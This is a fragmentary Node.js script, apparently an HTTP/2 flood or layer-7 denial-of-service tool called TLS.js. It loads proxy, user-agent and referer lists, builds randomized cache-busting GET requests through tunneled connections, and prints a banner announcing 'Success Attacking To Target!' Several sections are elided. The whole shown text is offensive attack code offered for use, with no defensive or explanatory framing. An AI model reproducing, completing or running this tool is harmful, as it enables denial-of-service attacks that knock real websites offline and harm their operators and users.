...
try {
var proxies = fs.readFileSync("proxye.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch(error){
...
var parsed = url.parse(host);
    ...
    console.log('node TLS.js [URL] [TIME]');
    process.exit();
}
const sigalgs = [
 ...
 try {
var UAs = fs.readFileSync('us.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
var referer = fs.readFileSync('REFERER.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
 } catch(error){
     console.log('Fail to load us.txt')
 }
class TlsBuilder {
    constructor (socket){
...
\x1b[0m        ░╚════╝░╚═════╝░╚═╝░░░╚═╝░░░░╚════╝░  ░╚════╝░╚══════╝`);
console.log(``);
console.log(`  [Broadcast] Success Attacking To Target!`);
console.log('  [Broadcast] URL: ' + parsed.host + '\x1b[0m');
    ...
    http2TUNNEL(socket){
        ...
        payload[":method"] = "GET";
        payload["Referer"] = referer[Math.floor(Math.random() * referer.length)]
        payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
        payload["Cache-Control"] = 'no-cache, no-store,private, max-age=50000, must-revalidate';
        payload["Pragma"] = 'no-cache, no-store,private, max-age=50000, must-revalidate';
        payload['client-control'] = 'max-age=50000, s-max-age=50000';
        ...
        var tunnel = http2.connect(parsed.href, {
...
BuildTLS.Alert();
var keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity });
